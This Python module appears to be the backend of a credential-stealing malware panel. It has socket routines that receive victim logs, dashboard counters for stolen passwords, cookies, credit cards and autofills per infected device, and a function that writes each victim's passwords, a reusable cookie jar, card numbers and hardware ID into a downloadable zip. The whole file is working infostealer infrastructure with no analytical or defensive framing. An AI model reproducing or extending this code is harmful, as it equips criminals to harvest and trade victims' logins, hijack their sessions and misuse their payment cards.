import os
import shutil
import zipfile
from datetime import datetime
from http.cookiejar import MozillaCookieJar, Cookie
from json import dumps as json_dumps
from json import loads
import time
from hashlib import md5 as __md5
import uuid
from libs import config as cfg


def uuid4():
    return str(uuid.uuid4())


def md5(data):
    return __md5(str(data).encode()).hexdigest()


def stamp() -> int:
    return int(time.time())


def dumps(text: dict):
    return json_dumps(text, separators=(',', ':'))


def decode(text: bytes) -> str:
    return text.decode("utf-8", errors="ignore")


def encode(text: str) -> bytes:
    return text.encode("cp1251", errors="ignore")


def prepare_logs_for_web(logs):
    logs_info = []
    for log in logs:
        log["browsers"] = loads(log["browsers"])
        logs_info.append({
            "log_id": log["rowid"],
            "user_id": log["device_id"],
            "info": {
                "browsers": len(log["browsers"]),
                "pwds": 0,
                "cookies": 0,
                "cc": 0,
                "autofills": 0
            },
            "time": datetime.utcfromtimestamp(log['time'] + 10800).strftime("%d.%m.%Y|%T").split("|")
        })

        i = len(logs_info) - 1
        for key in log["browsers"]:
            logs_info[i]["info"]["pwds"] += len(log["browsers"][key]["passwords"])
            logs_info[i]["info"]["cookies"] += len(log["browsers"][key]["cookie"])
            logs_info[i]["info"]["cc"] += len(log["browsers"][key]["cc"])
            logs_info[i]["info"]["autofills"] += len(log["browsers"][key]["autofill"])

    return logs_info


async def read_all(reader, buff=1024):
    data_length = decode(await reader.readline()).replace("\n", "")
    if not data_length.isdigit():
        return None, None
    data_length = int(data_length)
    Msg = b""
    while data_length > 0:
        data = await reader.read(buff)
        data_length -= len(data)
        Msg += data
    return decode(Msg), reader._transport.get_extra_info('peername')


def check_parametrs(obj: dict, parametrs=None):
    if parametrs is None:
        parametrs = ['method']
    for param in parametrs:
        if obj.get(param) is None:
            return False
    return True


async def write_all(writer, data):
    if isinstance(data, str):
        data = encode(data)
    elif isinstance(data, dict):
        data = encode(dumps(data))
    elif not isinstance(data, bytes):
        data = encode(str(data))

    writer.write(data)
    await writer.drain()
    writer.close()


def pagination(currentPage, pageCount, delta=3):
    left = currentPage - delta
    right = currentPage + delta + 1
    result = []
    for i in range(1, pageCount + 1):
        if left <= i < right:
            result.append({"active": i == currentPage, "num": i})
    return result


def prepare_log(log):
    log_name = f"Log_{log['rowid']}.zip"
    root_log_path = "prepared_logs/" + str(log["rowid"])
    path_to_log = root_log_path + "/" + log_name

    if not os.path.exists("prepared_logs"):
        os.mkdir("prepared_logs")

    if os.path.exists(root_log_path):
        shutil.rmtree(root_log_path)
        time.sleep(0.3)

    os.mkdir(root_log_path)

    log["browsers"] = loads(log["browsers"])

    passwords = ""  # all passwords log
    for browser in log["browsers"]:
        if not os.path.exists(root_log_path + "/browsers"):
            os.mkdir(root_log_path + "/browsers")

        temp_path = root_log_path + "/browsers/ " + browser
        if not os.path.exists(temp_path):
            os.mkdir(temp_path)

        browser_log = log["browsers"][browser]

        if len(browser_log["passwords"]) > 0:  # passwords log
            f = open(temp_path + "/passwords.txt", "w")
            for pwd in browser_log["passwords"]:
                text = cfg.pwd_format.format(pwd["u"], pwd["l"], pwd["p"])
                f.write(text)
                passwords += text
            f.close()

        if len(browser_log["cookie"]) > 0:  # cookie log
            defaults = {"version": 0, "port": None, "port_specified": False, "domain_specified": True,
                        "domain_initial_dot": True, "path_specified": True, "discard": False, "comment": None,
                        "comment_url": None, "rest": {}}
            obj = MozillaCookieJar()
            for c in browser_log["cookie"]:
                obj.set_cookie(
                    Cookie(
                        **defaults,
                        name=c["n"],
                        value=c["v"],
                        domain=c["h"],
                        path=c["p"],
                        secure=bool(int(c["s"])),
                        expires=int(c["e"])
                    )
                )
            obj.save(temp_path + "/cookie.txt", ignore_discard=True)

        if len(browser_log["cc"]) > 0:  # cc log
            f = open(temp_path + "/cc.txt", "w")
            for cc in browser_log["cc"]:
                f.write(cfg.cc_format.format(cc["name"], cc["num"], cc["m"], cc["y"]))
            f.close()

        if len(browser_log["autofill"]) > 0:  # autofill log
            f = open(temp_path + "/autofills.txt", "w")
            for fill in browser_log["autofill"]:
                f.write(cfg.autofills_format.format(fill["n"], fill["v"]))
            f.close()

    if passwords:
        open(root_log_path + "/passwords.txt", "w").write(passwords)

    log["hardware"] = loads(log["hardware"])
    if log["hardware"]:
        open(root_log_path + "/hardware_info.txt", "w").write(
            cfg.hardware_format.format(
                log["hardware"]["cpu"],
                log["hardware"]["ram"],
                log["hardware"]["res"],
                log["hardware"]["hwid"]
            )
        )

    zipObj = zipfile.ZipFile(path_to_log, "w")
    for folder, subfolders, files in os.walk(root_log_path):
        for file in files:
            if log_name in file:
                continue
            zipObj.write(
                os.path.join(folder, file),
                os.path.relpath(os.path.join(folder, file), root_log_path),
                compress_type=zipfile.ZIP_DEFLATED
            )
    zipObj.close()
    return path_to_log
